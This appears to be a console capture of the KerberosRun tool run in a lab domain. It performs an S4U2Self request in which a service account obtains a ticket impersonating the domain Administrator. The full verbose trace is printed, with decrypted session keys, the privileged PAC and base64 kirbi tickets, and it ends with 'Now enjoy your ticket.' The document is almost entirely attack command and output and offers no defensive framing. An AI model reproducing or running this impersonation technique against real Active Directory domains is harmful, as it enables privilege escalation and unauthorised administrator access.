```powershell
PS C:\Users> .\KerberosRun.exe --s4u2self --user spnuseraes --pass [...] --impersonateuser administrator --verbose

   __           __
  / /_____ ____/ /  ___ _______  ___ ______ _____
 /  '_/ -_) __/ _ \/ -_) __/ _ \(_-</ __/ // / _ \
/_/\_\\__/_/ /_.__/\__/_/  \___/___/_/  \_,_/_//_/

  v1.0.0
[*] Starting Kerberos Authentication ...
[*] Sending AS-REQ ...
    * MessageType :  KRB_AS_REQ
    * pvno :  5
    * PaData :
       - PA_PAC_REQUEST :
          - IncludePac :  True
    * Body :
       - KdcOptions :  RenewableOk, Canonicalize, Renewable, Forwardable
       - CName :
          - Type :  NT_PRINCIPAL
          - Name :  spnuseraes
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Type :  NT_SRV_INST
          - Name :  krbtgt
          - Name :  CORPLAB.LOCAL
       - Till :  9/13/2037 2:48:05 AM +00:00
       - RTime :  9/13/2037 2:48:05 AM +00:00
       - Nonce :  637261655
       - EType :
          - EncType :  AES256_CTS_HMAC_SHA1_96
          - EncType :  AES128_CTS_HMAC_SHA1_96
          - EncType :  RC4_HMAC_NT
          - EncType :  RC4_HMAC_NT_EXP
          - EncType :  RC4_HMAC_OLD_EXP
       - Addresses :
          - Type :  NetBios
          - Addresses :  ADMINSTAT
       - AdditionalTickets :
       - EncAuthorizationData :
       - From :
[x] Kerberos Error: KDC KDC_ERR_PREAUTH_REQUIRED: Additional pre-authentication required
[*] Adding encrypted timestamp ...
[*] Sending AS-REQ ...
    * MessageType :  KRB_AS_REQ
    * pvno :  5
    * PaData :
       - PA_PAC_REQUEST :
          - IncludePac :  True
       - PA_ENC_TIMESTAMP :
          - EType :  AES256_CTS_HMAC_SHA1_96
          - kvno :
          - Cipher :  [ClientEncryptedTimestamp...]
          - PaTimestamp :  5/27/2020 8:36:56 AM +00:00
          - PaUSec :  76
    * Body :
       - KdcOptions :  RenewableOk, Canonicalize, Renewable, Forwardable
       - CName :
          - Type :  NT_PRINCIPAL
          - Name :  spnuseraes
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Type :  NT_SRV_INST
          - Name :  krbtgt
          - Name :  CORPLAB.LOCAL
       - Till :  9/13/2037 2:48:05 AM +00:00
       - RTime :  9/13/2037 2:48:05 AM +00:00
       - Nonce :  637261656
       - EType :
          - EncType :  AES256_CTS_HMAC_SHA1_96
          - EncType :  AES128_CTS_HMAC_SHA1_96
          - EncType :  RC4_HMAC_NT
          - EncType :  RC4_HMAC_NT_EXP
          - EncType :  RC4_HMAC_OLD_EXP
       - Addresses :
          - Type :  NetBios
          - Addresses :  ADMINSTAT
       - AdditionalTickets :
       - EncAuthorizationData :
       - From :
[*] Receiving AS-REP...
    * MessageType :  KRB_AS_REP
    * pvno :  5
    * PaData :
       - PA_ETYPE_INFO2 :
          - EType :  AES256_CTS_HMAC_SHA1_96
          - S2kParams :
          - Salt :  CORPLAB.LOCALspnuseraes
    * CRealm :  CORPLAB.LOCAL
    * CName :
       - Type :  NT_PRINCIPAL
       - Name :  spnuseraes
    * Ticket :
       - tkt-vno :  5
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Name :  krbtgt
          - Type :  NT_SRV_INST
       - EncryptedPart :
          - kvno :  11
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Cipher :  [krbtgtEncryptedCipher...]
    * Enc-Part :
       - kvno :  4
       - EType :  AES256_CTS_HMAC_SHA1_96
       - Cipher :  [ClientEncryptedCipher...]
    * [Decrypted Enc-Part]:
       - AuthTime :  5/27/2020 8:36:56 AM +00:00
       - StartTime :  5/27/2020 8:36:56 AM +00:00
       - EndTime :  5/27/2020 6:36:56 PM +00:00
       - RenewTill :  6/3/2020 8:36:56 AM +00:00
       - Nonce :  637261656
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Type :  NT_SRV_INST
          - Name :  krbtgt
          - Name :  CORPLAB.LOCAL
       - EncryptedPaData :
          - PA_SUPPORTED_ETYPES :
             - Value : 1F000000
       - Key :
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Value :  1E157E1731C7A3A6DB4E7B459BFE28A455F3F6D63A8D32C85E5D2A7AB41D676A
       - KeyExpiration :  9/14/2037 2:48:05 AM +00:00
       - CAddr :
          - Type :  NetBios
          - Addresses :  ADMINSTAT
       - Flags :  EncryptedPreAuthentication, PreAuthenticated, Initial, Renewable, Forwardable
       - LastReq
          - Type :  0
          - Type :  5/27/2020 8:36:56 AM +00:00
[+] TGT Kirbi:
    - doIFHDCCBRigAwIBBaEDAgEWooIEHDCCBBhhggQUMIIEEKADAgEFoQ8bDUNPUlBMQUIuTE9DQUyiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDUNPUlBMQUIuTE9DQUyjggPSMIIDzqADAgESoQMCAQuiggPABIIDvIP+Zn69tXQECp4jl9hp0dj63afUgjqFNbsvTLLLSDRg8C2Xs2AFxObuYtmRkajj6SHgt5b8mMJrLmgrYdvVKxPxxXO7ePBMPsWVpcGAhX8w1pzhrjShR7nVD4EjsVb3adD83mV3MseBtK9OezsSiVl6WmcfHiIwW3ORIFVanijfUv+IPdFrtzrcKIK4BEO/CyhSV0A/o5TD8vQBPSOXzgLnmCSV4Jrl31/CrS/nVIyQINnXNxD8JnwcDEF9oNWUu833BSZT3hOP2bRA1bePh6fxUsR1RpEsXvMIeo8XZWlianxcri8uQun2kZEQgBDu8HJqQ/DX+7FyI4YP3cAMljYKc4Owv+rVWN4bp9HTP41Ryvvn3SFOBcvKPNkv8nyc+t3mep0YdXPOhV3h4RaVwFRGieD2BLOc9no4PPQE50ucAG7bM93xS4+svEIKrqxaMSImrRqLRIbS6bzV4GVi0nLheFsYIKlTLtdGKf0w5t+U9Dy8r0QzkVWy5RhM06fyIukAHCZkuB8ehlvNDUvg9fJNxYlVFge3Y+VtvBqE/RuARCPj70ibUTelyg2SA5V8B4gEWKtoP+MLRTEsKATsc1CHkSTegdIwb8Dx1+dsdqY6hzYrrH0+CQKdAECM+yOaFnd4YaaHV70+tdoDjch6EX9cMsKsb1swVWd3Bqsyc5hQkGnsLPMw1loCsq5ofbJkpYqd0YdD8NtLelH+ZwXwABBm7IIjBjGNtTv1OvzWpPKjtfRSgzGfDMacRHvsNZpYn8ckxCEuye0oMgRJACSmbKRIUjyrDbr+CadHcP/lzztNpNzU3GLJIMS/XUL74yB5knPSs4DA4dQ9qyutLKVbxqtiGtIuX2/1nGe6iWzlaNrHATgM8as1QmSJ7MVQH6CgJefeUDVPUx+8/W0VP5kPAqglDAVSZ3QOEHHRplj6+8vZ85nwdwL13g1uZKRX7hMSkhDrbAb0lPf/vFRo7tva5JScxa9BP3BGddEhXr2sBxyH7OHJ4PkKDzqpPiCmi+t6E8WHq8kcMQ8WTNJEeWuP1yAOuUyX4ROv0XSuyn4xamBe7XNVt6OaSHGO815xwhlg6gMelnjUQy67blEDUPdNaqGMzIFmg/KK178QZJh0mEknh18Hm6NpoXgsgBkF67m3jwTiKhT+0Zq2TW8jKyaKiQJ+gfeGDMExgRZ3SrAmeOw3V0ZeHGQ3PFxkBj9Hc7q/aKywy9FhdLM7ckxY/2x/wbcQK7YsSrcMzRK6KRlk/2qHErNAJiG/aKta+JRBo4HrMIHooAMCAQCigeAEgd19gdowgdeggdQwgdEwgc6gKzApoAMCARKhIgQgHhV+FzHHo6bbTntFm/4opFXz9tY6jTLIXl0qerQdZ2qhDxsNQ09SUExBQi5MT0NBTKIXMBWgAwIBAaEOMAwbCnNwbnVzZXJhZXOjBwMFAEDhAAClERgPMjAyMDA1MjcwODM2NTZaphEYDzIwMjAwNTI3MTgzNjU2WqcRGA8yMDIwMDYwMzA4MzY1NlqoDxsNQ09SUExBQi5MT0NBTKkiMCCgAwIBAqEZMBcbBmtyYnRndBsNQ09SUExBQi5MT0NBTA==
[*] Sending TGS-REQ [S4U2Self] ...
    * MessageType :  KRB_TGS_REQ
    * pvno :  5
    * PaData :
       - PA_TGS_REQ :
          - KRB_AP_REQ :
             - pvno :  5
             - ApOptions :  Reserved
             - Ticket :
                - tkt-vno :  5
                - Realm :  CORPLAB.LOCAL
                - SName :
                   - Type :  NT_SRV_INST
                   - Name :  krbtgt
                   - Name :  CORPLAB.LOCAL
                - EncryptedPart :
                   - kvno :  11
                   - EType :  AES256_CTS_HMAC_SHA1_96
                   - Cipher :  [krbtgtEncryptedCipher...]
             - Authenticator :
                - kvno :
                - EType :  AES256_CTS_HMAC_SHA1_96
                - Realm :  CORPLAB.LOCAL
                - SequenceNumber :  637261658
                - Subkey :
                   - EType :  AES256_CTS_HMAC_SHA1_96
                   - KeyValue :  161C88517AAF9648A4AA42143C992F5E3F4D6A465AEF90FE69B472BBCE676416
                - CTime :  5/27/2020 8:36:56 AM +00:00
                - CuSec :  326
                - CName :
                   - Type :  NT_PRINCIPAL
                   - Name :  spnuseraes
                - Checksum :
                   - Type :  HMAC_SHA1_96_AES256
                   - Checksum :  B277A4DEB00C649EC6C8735F
                - AuthorizationData :
                - AuthenticatorVersionNumber :  5
       - PA_FOR_USER :
          - UserName :
             - Type :  NT_ENTERPRISE
             - Name :  administrator@corplab.local
          - UserRealm :  CORPLAB.LOCAL
          - AuthPackage :  Kerberos
          - Checksum :
             - Type :  KERB_CHECKSUM_HMAC_MD5
             - Checksum :  6ED520CA9B16AA5573A1C10F1C9D7B16
    * Body :
       - KdcOptions :  EncTktInSkey, RenewableOk, Renewable, Forwardable
       - Realm :  corplab.local
       - SName :
          - Type :  NT_PRINCIPAL
          - Name :  spnuseraes
       - Till :  9/13/2037 2:48:05 AM +00:00
       - RTime :
       - Nonce :  637261657
       - EType :
          - EncType :  AES256_CTS_HMAC_SHA1_96
          - EncType :  AES128_CTS_HMAC_SHA1_96
          - EncType :  RC4_HMAC_NT
          - EncType :  RC4_HMAC_NT_EXP
          - EncType :  RC4_HMAC_OLD_EXP
       - EncAuthorizationData :
       - From :
       - AdditionalTickets :
[*] Receiving TGS-REP [S4U2Self] ...
    * MessageType :  KRB_TGS_REP
    * pvno :  5
    * PaData :
    * CRealm :  CORPLAB.LOCAL
    * CName :
       - Type :  NT_ENTERPRISE
       - Name :  administrator@corplab.local
    * Ticket :
       - tkt-vno :  5
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Name :  spnuseraes
          - Type :  NT_PRINCIPAL
       - EncryptedPart :
          - kvno :  4
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Cipher :  [ServiceEncryptedCipher...]
    * Enc-Part :
       - EType :  AES256_CTS_HMAC_SHA1_96
       - kvno :
       - Cipher :  [SubSessionKeyEncryptedCipher..]
    * [Decrypted Enc-Part]:
       - AuthTime :  5/27/2020 8:36:56 AM +00:00
       - StartTime :  5/27/2020 8:36:56 AM +00:00
       - EndTime :  5/27/2020 6:36:56 PM +00:00
       - RenewTill :  6/3/2020 8:36:56 AM +00:00
       - Nonce :  637261657
       - Realm :  CORPLAB.LOCAL
       - SName :
          - Type :  NT_PRINCIPAL
          - Name :  spnuseraes
       - EncryptedPaData :
       - Key :
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Value :  7127CB38BD4F7C5A8FDA1FA3D3083A16A4E3259A7DCC9245EED09FF61CF79B3B
       - KeyExpiration :
       - Flags :  EncryptedPreAuthentication, PreAuthenticated, Renewable
       - LastReq
          - Type :  0
          - Type :  5/27/2020 8:36:56 AM +00:00
    * [Decrypted Ticket Enc-Part]:
       - AuthTime :  5/27/2020 8:36:56 AM +00:00
       - StartTime :  5/27/2020 8:36:56 AM +00:00
       - EndTime :  5/27/2020 6:36:56 PM +00:00
       - RenewTill :  6/3/2020 8:36:56 AM +00:00
       - CRealm :  CORPLAB.LOCAL
       - CName :
          - Type :  NT_ENTERPRISE
          - Name :  administrator@corplab.local
       - AuthorizationData :
          - Type :  AdIfRelevant
             - Type :  AdWin2kPac
                - Type :  AdWin2kPac
                - Version :  0
                - LogonInfo :
                   - PacType :
                   - DomainId :
                      - Revision :  1
                      - IdentifierAuthority :  NTAuthority
                      - SubAuthority :  21, 1977317821, 1772133574, 954835042
                      - SubAuthorityCount :  4
                   - ExtraIds :
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - Sid :  S-1-18-2
                      - Revision :  1
                      - IdentifierAuthority :  AuthenticationAuthority
                      - SubAuthority :  2
                      - SubAuthorityCount :  1
                   - DomainSid :
                      - Attributes :  0
                      - Id :  954835042
                      - Value :  S-1-5-21-1977317821-1772133574-954835042
                   - ExtraSidCount :  1
                   - ExtraSids :
                      - Id :  2
                      - Attributes :  0
                      - Value :  S-1-18-2
                   - GroupCount :  5
                   - GroupId :  513
                   - GroupIds :
                      - RelativeId :  512
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - RelativeId :  513
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - RelativeId :  520
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - RelativeId :  518
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - RelativeId :  519
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                   - GroupSid :  S-1-5-21-1977317821-1772133574-954835042-513
                   - GroupSids :
                      - Id :  512
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-512
                      - Id :  513
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-513
                      - Id :  520
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-520
                      - Id :  518
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-518
                      - Id :  519
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-519
                   - HomeDirectory :
                   - HomeDrive :
                   - KickOffTime :  1/1/0001 12:00:00 AM +00:00
                   - LastFailedILogon :  1/1/1601 12:00:00 AM +00:00
                   - LastSuccessfulILogon :  1/1/1601 12:00:00 AM +00:00
                   - LogoffTime :  1/1/0001 12:00:00 AM +00:00
                   - LogonCount :  144
                   - LogonScript :
                   - LogonTime :  5/27/2020 8:09:42 AM +00:00
                   - ProfilePath :
                   - PwdCanChangeTime :  5/20/2020 3:37:53 AM +00:00
                   - PwdLastChangeTime :  5/19/2020 3:37:53 AM +00:00
                   - PwdMustChangeTime :  1/1/0001 12:00:00 AM +00:00
                   - Reserved1 :  0, 0
                   - Reserved3 :  0
                   - ResourceDomainId :  S-1-5-21-1977317821-1772133574-954835042
                   - ResourceDomainSid :  S-1-5-21-1977317821-1772133574-954835042
                   - ResourceGroupCount :  1
                   - ResourceGroupIds :  System.Collections.Generic.List`1[Kerberos.NET.Entities.Pac.GroupMembership]
                   - ResourceGroups :
                      - Attributes :  SE_GROUP_MANDATORY, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_ENABLED, SE_GROUP_RESOURCE
                      - Id :  572
                      - Value :  S-1-5-21-1977317821-1772133574-954835042-572
                   - SubAuthStatus :  0
                   - UserAccountControl :  ADS_UF_LOCKOUT
                   - UserDisplayName :
                   - UserFlags :  LOGON_EXTRA_SIDS, LOGON_RESOURCE_GROUPS
                   - UserId :  500
                   - UserName :  Administrator
                   - UserSessionKey :  00000000000000000000000000000000
                   - UserSid :  S-1-5-21-1977317821-1772133574-954835042-500
                   - DomainName :  CORP
                   - ServerName :  DC1
                   - BadPasswordCount :  0
                   - FailedILogonCount :  0
                - ClientInformation :
                   - PacType :  CLIENT_NAME_TICKET_INFO
                   - ClientId :  5/27/2020 8:36:56 AM +00:00
                   - Name :  administrator@corplab.local
                   - NameLength :  54
                - KdcSignature :
                   - PacType :  0
                   - RODCIdentifier :  0
                   - Signature :  017B1F728AF1BEDBE18785DA
                   - SignatureData :  [...]
                   - Type :  HMAC_SHA1_96_AES256
                   - Validated :  False
                   - Validator :
                      - Validator :  PaForUserChecksum
                      - Validator :  017B1F728AF1BEDBE18785DA
                - ServerSignature :
                   - PacType :  0
                   - RODCIdentifier :  0
                   - Signature :  7049AB64FE5D686544A3C6A4
                   - SignatureData :  [...]
                   - Type :  HMAC_SHA1_96_AES256
                   - Validated :  False
                   - Validator :
                      - Validator :  PaForUserChecksum
                      - Validator :  7049AB64FE5D686544A3C6A4
                - UpnDomainInformation :
                   - PacType :  UPN_DOMAIN_INFO
                   - Upn :  Administrator@corplab.local
                   - UpnLength :  54
                   - UpnOffset :  16
                   - Domain :  CORPLAB.LOCAL
                   - DnsDomainNameLength :  26
                   - DnsDomainNameOffset :  72
                - DecodingErrors :
                - HasRequiredFields :  True
       - CAddr :
       - Flags :  EncryptedPreAuthentication, PreAuthenticated, Renewable
       - Key :
          - EType :  AES256_CTS_HMAC_SHA1_96
          - Value :  7127CB38BD4F7C5A8FDA1FA3D3083A16A4E3259A7DCC9245EED09FF61CF79B3B
       - Transited :
          - Type :  DomainX500Compress
          - Contents :
[+] TGS Kirbi:
    - doIFoDCCBZygAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoQ8bDUNPUlBMQUIuTE9DQUyiFzAVoAMCAQGhDjAMGwpzcG51c2VyYWVzo4IEWzCCBFegAwIBEqEDAgEEooIESQSCBEUUm2ueUzGCM3SzR4vsQOS2hDmgWEhPBj3EXAtgbECZrqbt1T64jEvpVFL+CcV8hC2tPnLJa5Pq7Hn66d9iReGsG6zsjW73P5pc0VMjGsKknHgchF1i4zrlp+FX+EJW7/WcswcUuBwrsggSS9b+tJtSt7/GLdwxcxKogNibIIWnSwkJ5dy4IuutrnbFK1mgNR14vkaxlHkFMwzUsEWRPx1AjY2UqOfN0tP6NNFJH9KA7/lA7MPXruJ8TGGV56NkWUgfRIiRvVAYR/L2BjEnu6KKBKgg9jWNPtu6epNuI4rY8SvXLK9GjdJrloxQW+ooereVUrCq5+cEwkmTcQeotLEd0Fsv3DYVkK8iVPSGsA0mHKW7GbiWhGYVmhEbHp3YHhFNcUpqg1ul48fU8qh9af8y2KFHmMRvtEhISgCmu5o6s+bKd/a2w7CUIpDxrhnd2qSixm2/wVExMsWBIyI2HxfexKiZONd+cOusHDulR+GjYECzuNRyllqu62Js9E8AYrKM/R9z5LZqZFqy3IX1szQAWJK3ecbK5nP1lji6lVX4mLtcjbe9vfGj3XVl9L9nPa5IHa1ljb/8zZ36uhaWl2JPKIIVg8w4ZObkB7nwjc+5MghsQzHPE57BYdJpB10ITHnKUMo19/C7MgJgbcR0O+Rz2DwfGKE/4kMnAPfLuVeuWNc8sNgJm8ew3Oh4iIEkzwtjmzrEdVzVJJ1fgxnaEqyH4JYoTQ9x9f3ojaIvNLs5gIZ3EUtrWOR0/ZKvylX7icOTSJi2x7SJcMyf0oLhCeY4BAb9FoPh7C8cF9jguE1VzrvzF8xwP7NIOXnlDb3A4Nwoygm4AfmFSLhTt7eytBKemmZJAudBf40VsjAokNj7ebm9iIckh4NlYDeJnt0AhrdYL+AJo6Q4K4H48bMuoIPdZ5+jw2jz/99gJPxqCnCMMPdTYDn6phXJ94KrFNThqr9pj1AI3nezWrkhV/pBmRyUnsSDgOdO8wVvXnJg4TMK2mBsCFR8rffZEGD/o2IEADYmzW7pMZRhmgFIJX78w8lBGPM2GzQWYqolNCCOKp7+42exY14DjMDLckIa2W2pQE8smbJD6T0SiU9a4w8q4r7CfPyOzGfUiTRiHkWcoNcpS4IeBVVPe+1b1k5fWe/al86BDzn+DcG8FSsm5EYHE91jkwaUS6DPN94R4rVHdk+jr+EhaEyksCeAoXpemPZOxiUyum78pp1hf02FW7gyKJshru6RtHCIr6JUN5/b0JY1vxZwa6Y31hp2AH2uS6NbE4UE/1huNNwbdUNQK3D0IEfEGxSZ9xghAvIvT7ouMFYOo3CyE7lW7IQd6TKaXhsEuB1CYdic86WBUhuxUGNCHwmDzH5SqFdZRoln7ISibJjPY6nvv4H0TdJgnNKwksV6d5NtQCgf3lhx998JwictjCVUlrJZBz69RGf+MaK9suaLXYhqvvXZo4HxMIHuoAMCAQCigeYEgeN9geAwgd2ggdowgdcwgdSgKzApoAMCARKhIgQgcSfLOL1PfFqP2h+j0wg6FqTjJZp9zJJF7tCf9hz3mzuhDxsNQ09SUExBQi5MT0NBTKIoMCagAwIBCqEfMB0bG2FkbWluaXN0cmF0b3JAY29ycGxhYi5sb2NhbKMHAwUAAKEAAKURGA8yMDIwMDUyNzA4MzY1NlqmERgPMjAyMDA1MjcxODM2NTZapxEYDzIwMjAwNjAzMDgzNjU2WqgPGw1DT1JQTEFCLkxPQ0FMqRcwFaADAgEBoQ4wDBsKc3BudXNlcmFlcw==
[+] Done! Now enjoy your ticket.
```